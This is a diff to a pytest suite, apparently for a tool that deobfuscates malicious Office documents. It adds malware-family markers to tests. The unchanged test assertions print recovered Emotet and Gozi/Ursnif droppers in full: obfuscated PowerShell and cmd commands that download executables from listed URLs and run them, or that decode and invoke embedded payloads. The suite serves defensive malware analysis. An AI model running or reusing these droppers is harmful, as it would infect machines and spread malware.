@@ -33,6 +33,8 @@ class maldoc(object):
 		return process_file('','',self.data,strip_useless=True)
 
 @pytest.mark.gozi
+@pytest.mark.ursnif
+@pytest.mark.cdf2
 @pytest.mark.shapes
 @pytest.mark.slow
 def test_e4ecb82fb8a2bf785c2f976c1feea57bca2ff115f5a26c00a9282f9d7f43eb43(path):
@@ -41,6 +43,9 @@ def test_e4ecb82fb8a2bf785c2f976c1feea57bca2ff115f5a26c00a9282f9d7f43eb43(path):
 	r=t.run()
 	assert r[0][1][1] == '''CMD Cmd/C   "Set  ctSI= .( ([StriNG]$vERbOSEPrEFeReNce)[1,3]+\'x\'-JOIN\'\') (NEW-ObJEct  io.CompreSSion.DefLAtestrEaM([IO.MemOrYStReam] [sYsTEm.COnVERT]::frOmbASE64STrINg(\'PZBda4MwFIb/Si4CqbhGuu3GBqGs28CxrowySmE3MT3W1JhIetAO8b9PZevted7znA/6tdWJhXbusjMoJB+AfA/Z2miwKGiaNgkrEOtlFEmPF4tQcuWq6ICf1q3+SCYLLZUHibqRE453h+1LXP4HlK4L8BXw2kRHiTJS7Q0V0g/DcncdG3nmo8fF+nyj8gLGyMo12p4mMy5OjO9qo3HGViwQdLN/Jwlh9w8xE7TKfULBNkuEqg7ZNwtHHjIOV2Aid8OOqpjRzdsT0ZaM5wUd+p+ODm/gz661xsnjqzYwZe7IKAxEahtXwjwdpFNFZIOnFL2SqIqu738B\') ,[IO.CompRessiON.cOmpreSSIoNmoDE]::dECOmPreSs ) ^|FOReach { NEW-ObJEct  sYstem.Io.StrEAmreAdeR( $_,[teXT.EnCoDiNG]::aSCii) } ^| foREaCh { $_.rEADtoENd() }) &&POwERshelL    $oB84i  =  [tyPe]( \\"{3}{0}{1}{2}\\"-F\'n\',\'MEN\',\'t\',\'eNvirO\' )    ; ${executiOnCONtExt}.\\"InVokec`Om`ma`ND\\".\\"in`VO`KES`CrIPT\\"(  (    (  GET-IteM  variabLE:oB84i   ).vaLuE::( \\"{1}{3}{2}{0}\\" -f \'E\',\'ge\',\'NVIroNmEnTVARiABl\',\'TE\'  ).Invoke( (\\"{0}{1}\\" -f\'cTs\',\'I\'),(  \\"{1}{2}{0}\\"-f \'S\',\'PR\',\'oCEs\') ) ))"'''
 
+@pytest.mark.gozi
+@pytest.mark.ursnif
+@pytest.mark.cdf2
 @pytest.mark.shapes
 @pytest.mark.slow
 def test_38c459e56997e759ca680f88aae4428d9c76e9fae323b4d2238adf203036007c(path):
@@ -50,6 +55,7 @@ def test_38c459e56997e759ca680f88aae4428d9c76e9fae323b4d2238adf203036007c(path):
 	assert r[0][2][1] == '''cMd.EXE /c poWerShelL.exe -ec KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwBwAGkAdgBhAGMAdAB1AGIAbQBpAC4AYwBvAG0ALwB0AHkAYwBsAGEAbQAvAGYAcgBlAHMAcwByAC4AcABoAHAAPwBsAD0AYwByAGUAYgAyAC4AdABrAG4AIgAsACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAIAArACAAJwBcADQANQAyAGUANAA5ADYAZAAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQAnAFwANAA1ADIAZQA0ADkANgBkAC4AZQB4AGUAJwA7ACAARQB4AGkAdAA='''
 
 @pytest.mark.emotet
+@pytest.mark.xml
 @pytest.mark.var_end_underscore
 @pytest.mark.func_Create
 @pytest.mark.keycodeconstants_at
@@ -73,6 +79,7 @@ def test_ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f(path):
 	assert r[0][1][1] == '''powershell $upn0rxUQ9 = \'$A79ly2i = new-obj0-9288027360ect -com0-9288027360obj0-9288027360ect wsc0-9288027360ript.she0-9288027360ll;$hC0u5Lk = new-object sys0-9288027360tem.net.web0-9288027360client;$eeVnNb = new-object random;$ME8h0Y = \\"0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://bignorthbarbell.com/yuf2G22rSI3c0s,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://mail.dentaladvance.pt/iyRttLHb,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://3d.tdselectronics.com/IWZfq9gD,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://greenflagtrails.co.za/HOHvd9NFU_BaZ62,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://kuoying.net/wp-admin/NcdixzAUZNsxHs0_8DoIcKe\\".spl0-9288027360it(\\",\\");$AmPFqKf = $eeVnNb.nex0-9288027360t(1, 65536);$V2sUJ = \\"c:\\win0-9288027360dows\\tem0-9288027360p\\24.ex0-9288027360e\\";for0-9288027360each($Y92Bsgj in $ME8h0Y){try{$hC0u5Lk.dow0-9288027360nlo0-9288027360adf0-9288027360ile($Y92Bsgj.ToS0-9288027360tring(), $V2sUJ);sta0-9288027360rt-pro0-9288027360cess $V2sUJ;break;}catch{}}\'.replace(\'0-9288027360\', $NRYM8nmxZ);$c4xw1H = \'\';iex($upn0rxUQ9);'''
 
 @pytest.mark.emotet
+@pytest.mark.xml
 @pytest.mark.keycodeconstants_bang
 @pytest.mark.slow
 def test_766bbe194f281546b2675c63ddf61c89fa005e6cf6734e7fad4e74392f87821a(path):
@@ -234,6 +241,7 @@ def test_3e8ddb4bcc576ecd2bbdfeae89dbc7733920cd077295e40bfbc3e510d41e848d(path):
 	assert r[0][1][1] == '''cmd /V/C"^se^t D^wT^F=    ^ ^ ^    ^ ^ ^ ^ ^ ^  ^}^}^{hct^ac}^;k^a^er^b^;^j^Z^a^$ m^e^tI-^e^k^ovn^I;)^j^Z^a^$ ,pCX^$(eli^Fd^a^oln^w^o^D.hwd^$^{yrt{)t^Q^S$^ ni^ ^pCX^$(^hc^aero^f;^\'ex^e.\'+^aKV^$+\'^\\^\'+c^i^lbu^p:vn^e$=^jZ^a^$;\'7^1^\' ^=^ a^KV$;)^\'@\'(tilp^S^.^\'2^t^j3^T^fv/eg.^an^ahs^o^h^s//^:ptth^@Ss^w^F^uCc^6^0/m^oc^.^eertrew^o^p-l^x//:^p^t^th@K^2fc^pdnc^UO/^m^oc.r^amilaf^o^s//^:^ptth^@^D^z^t^ECv^A^f/m^oc^.na^iro^dn^ien^i^l//^:^p^tth@kKy^eo^3^D/^moc.ra^l^o^sdn^acir^tce^le^ami^taf//:p^t^t^h\'^=^tQS$;tneilCbeW^.teN ^tc^ej^bo^-^wen^=h^w^d^$^ ll^e^hsrew^op&&^f^or /^L %^X ^in (376^,^-^1^,0)^do s^e^t ^KR=!^KR!!D^wT^F:~%^X,1!&&^if %^X ^l^e^q ^0 ca^l^l %^KR:^~-3^7^7%"'''
 
 @pytest.mark.emotet
+@pytest.mark.cdf2
 @pytest.mark.func_Format
 def test_27795a1f8929bda0569f58f10730b59ea02c13f276b55a2b8cf8b0af68ba9f9c(path):
 	t=maldoc(path+'27795a1f8929bda0569f58f10730b59ea02c13f276b55a2b8cf8b0af68ba9f9c')
@@ -241,6 +249,7 @@ def test_27795a1f8929bda0569f58f10730b59ea02c13f276b55a2b8cf8b0af68ba9f9c(path):
 	assert r[0][1][1] == '''cmd /V^:ON/C"s^e^t Q^3^d^A=^ ^     ^  ^       ^  }}^{hc^tac^};^kaer^b^;vA^K^$ me^tI-ek^ovnI^;)vA^K^$ ,zZL^$(e^l^iFda^o^ln^w^o^D^.pl^q^$^{^yrt^{)RW^b^$^ ni^ ^z^Z^L^$(hcaer^of;\'^e^x^e.^\'^+a^JN^$+^\'\\^\'+ci^lb^u^p:vne^$=v^AK$^;^\'0^7^1^\' =^ aJN$;)^\'@^\'(ti^l^pS^.^\'X/^moc.n^i^s^e^mhce^tari^w//:^p^t^th@j/^t^en^.^s^s^en^l^l^e^w^tr^a//^:p^t^th@CoxX^Yh/m^oc.^dnr-ecn^aill^a//^:^p^tt^h@1^H/r^f.ved-^s^p^pa.rue^tcennoc//^:pt^th@B^o^l^aiR^l^k/m^oc^.^s^uwag//^:p^tt^h^\'=RW^b^$^;tn^eilCbeW^.^t^eN ^tce^j^bo^-^w^en^=plq^$^ ^l^le^hsrew^op&&^f^or /^L %^F ^in (^35^1;^-1^;^0)^do ^set V^P=!V^P!!Q^3^d^A:~%^F,1!&&i^f %^F=^=^0 ca^l^l %V^P:~^-3^5^2%"'''
 
 @pytest.mark.emotet
+@pytest.mark.cdf2
 @pytest.mark.func_Format
 def test_4fe2f96008ee97e3fda9b9abb9a58d286bd69c974e4aa1bec41a31f600720c0d(path):
 	t=maldoc(path+'4fe2f96008ee97e3fda9b9abb9a58d286bd69c974e4aa1bec41a31f600720c0d')
@@ -250,7 +259,8 @@ def test_4fe2f96008ee97e3fda9b9abb9a58d286bd69c974e4aa1bec41a31f600720c0d(path):
 
 @pytest.mark.emotet
 @pytest.mark.slow
-@pytest.mark.doc
+@pytest.mark.slowest
+@pytest.mark.cdf2
 @pytest.mark.func_Asc
 @pytest.mark.func_Chr
 @pytest.mark.func_Len
@@ -285,9 +295,10 @@ def test_f6de41b01aa340613e87bbd93e4c2c061b4c37b7fc10fa7bf2b7d94c63748145(path):
 	r=t.run()
 	assert r[0][1][1] == """cmd.exe /c powershell "\'powershell ""Start-Sleep 60;$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\'\'H4sIAAAAAAAA/3SQwWqzQBSFX+WCgkoS8/vvGpPQJ+iqu7aLcTzW244z05mbGBHfvVQKhUKXl3v4Dt/pLlYLO0vHRAcoQXKmB9zkEd5P+VOUwPb1hVLovirmVFhXp6qWMM25xbhzzRu0UJyiYCgtpBzRaMOwQscENx6SMxVl60ZrnGo7NshX1jaFvR4Eg99kzzL4u/8lbsiKetFKdP/d9K9eAuQSLK13vaTdBdXpPs965SFuigFXxhhL7YZ9i7Jh47jNtpkz3LlguMOvV1F3LkDpnvI0OCG2tEKLmbv8xzzrRfxhv882X6mCdvigqpibAPVeL7TUx+SqDLfrYlFUkJ0PTiNGyv9S+wwAAP//biF2KmwBAAA=\'\'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\'""| out-file -filepath %tmp%\\cmd048.bat -encoding ascii; cmd /c \'%tmp%\\cmd048.bat\'"""
 
+@pytest.mark.gozi
 @pytest.mark.ursnif
 @pytest.mark.slow
-@pytest.mark.doc
+@pytest.mark.cdf2
 @pytest.mark.func_Array
 @pytest.mark.func_CInt
 @pytest.mark.func_CStr
